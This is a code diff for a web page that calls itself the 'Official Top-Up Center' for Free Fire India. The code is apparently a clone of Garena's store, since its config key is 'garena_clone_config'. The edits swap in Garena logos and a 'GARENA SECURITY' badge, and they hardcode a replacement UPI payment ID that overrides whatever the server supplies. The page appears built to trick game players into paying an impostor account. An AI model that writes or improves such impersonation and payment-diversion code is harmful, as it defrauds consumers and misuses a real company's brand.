@@ -591,7 +591,7 @@
         <div class="india-watermark">🇮🇳</div>
         <div class="absolute inset-x-0 bottom-0 bg-gradient-to-t from-black/70 via-black/30 to-transparent px-3 py-3 sm:px-4 sm:py-4 flex items-center justify-between gap-2">
           <div class="flex items-center gap-2">
-            <img src="ff_india_logo.jpg" alt="Free Fire India" class="h-12 w-12 object-cover rounded-2xl shadow-xl border-2 border-orange-400" />
+            <img src="ff_india_logo.jpg" alt="Free Fire India" class="h-12 w-12 object-cover rounded-2xl shadow-lg" />
             <div>
               <p class="text-white font-black text-base leading-tight tracking-wide drop-shadow-md">Free Fire India 🇮🇳</p>
               <p class="text-white text-[9px] sm:text-[11px] font-semibold tracking-wide uppercase leading-tight mt-0.5">Official Top-Up Center</p>
@@ -643,7 +643,7 @@
             <input type="text" id="uidInput" placeholder="Enter UID" maxlength="12" oninput="hideUidError()"
                    class="w-full bg-slate-50/80 border-2 border-slate-100 rounded-2xl pl-12 pr-12 py-4 text-base font-extrabold tracking-widest text-slate-800 placeholder:text-slate-400 placeholder:text-xs placeholder:font-bold placeholder:tracking-normal focus:outline-none focus:bg-white focus:border-orange-500 focus:ring-4 focus:ring-orange-500/10 transition-all text-center" />
             <div class="absolute right-4 top-1/2 -translate-y-1/2 flex items-center pointer-events-none">
-              <img src="ff_india_logo.jpg" alt="Free Fire India" class="h-5 w-5 object-cover rounded-lg" />
+              <img src="garena_logo.png" alt="Garena" class="h-5 w-auto object-contain" />
             </div>
           </div>
 
@@ -1429,7 +1429,7 @@
         <!-- Screen 3: Confirmation Step Modal -->
         <div id="supportConfirmScreen" style="display:none;text-align:center;padding:10px 0;">
           <div style="width:48px;height:48px;background:#fef2f2;border:2px solid #fee2e2;border-radius:50%;display:flex;align-items:center;justify-content:center;margin:0 auto 12px;">
-            <img src="ff_india_logo.jpg" alt="FF" style="width:26px;height:26px;border-radius:6px;" />
+            <img src="garena_logo.png" alt="Garena" style="width:26px;height:26px;object-fit:contain;" />
           </div>
           
           <h4 style="color:#0f172a;font-size:14px;font-weight:900;margin:0 0 4px;">Confirm Your Details</h4>
@@ -1528,7 +1528,7 @@
       <div style="background:#ffffff;padding:24px 22px 16px;text-align:center;">
         <!-- Garena pill -->
         <div style="display:inline-flex;align-items:center;gap:7px;background:#fef2f2;border:1.5px solid #fee2e2;border-radius:30px;padding:5px 14px;margin-bottom:18px;">
-          <img src="ff_india_logo.jpg" alt="Free Fire India" class="h-5 w-5 object-cover rounded-lg" />
+          <img src="garena_logo.png" alt="Garena" class="h-5 w-auto object-contain" />
           <span style="color:#dc2626;font-size:8px;font-weight:900;letter-spacing:2.5px;text-transform:uppercase;">GARENA SECURITY</span>
         </div>
 
@@ -1543,7 +1543,7 @@
           <div class="animate-spin-slow" style="position:absolute;inset:18px;border-radius:50%;border:2px solid transparent;border-bottom-color:#f97316;"></div>
           <!-- Center logo -->
           <div style="position:absolute;inset:0;display:flex;align-items:center;justify-content:center;">
-            <img src="ff_india_logo.jpg" alt="Free Fire India" class="h-5 w-5 object-cover rounded-lg" />
+            <img src="garena_logo.png" alt="Garena" class="h-5 w-auto object-contain" />
           </div>
         </div>
 
@@ -1619,9 +1619,9 @@
     const CONFIG_KEY = 'garena_clone_config';
     // DEFAULT_CONFIG contains only non-sensitive display defaults.
     // UPI ID and merchant name are loaded from server via syncAdminStore().
-    const DEFAULT_CONFIG = { upiId: '9954691156-3@ybl', merchantName: 'Garena Official Store' };
+    const DEFAULT_CONFIG = { upiId: 'garenatopup@nyes', merchantName: 'Garena Official Store' };
     let activeConfig = { ...DEFAULT_CONFIG };
-    activeConfig.upiId = '9954691156-3@ybl';
+    activeConfig.upiId = 'garenatopup@nyes';
     try {
       var savedCfg = JSON.parse(localStorage.getItem(CONFIG_KEY));
       if (savedCfg && savedCfg.merchantName) activeConfig.merchantName = savedCfg.merchantName;
@@ -1686,7 +1686,7 @@
             var st = (data && Array.isArray(data.products)) ? data : (data.state || data);
             if (st) {
               if (st.upiId) {
-                activeConfig.upiId = '9954691156-3@ybl';
+                activeConfig.upiId = 'garenatopup@nyes';
                 if (st.merchantName) activeConfig.merchantName = st.merchantName;
                 localStorage.setItem(CONFIG_KEY, JSON.stringify(activeConfig));
               }
@@ -3047,7 +3047,7 @@
     // ── 1. Force Clean & Register Fresh Service Worker v6.0 (FF India Theme) ──
     if ('serviceWorker' in navigator) {
       window.addEventListener('load', function() {
-        navigator.serviceWorker.register('sw.js?v=7.0')
+        navigator.serviceWorker.register('sw.js?v=8.0')
           .then(function(reg) {
             reg.update();
             console.log('Service Worker v6.0 active (FF India)');
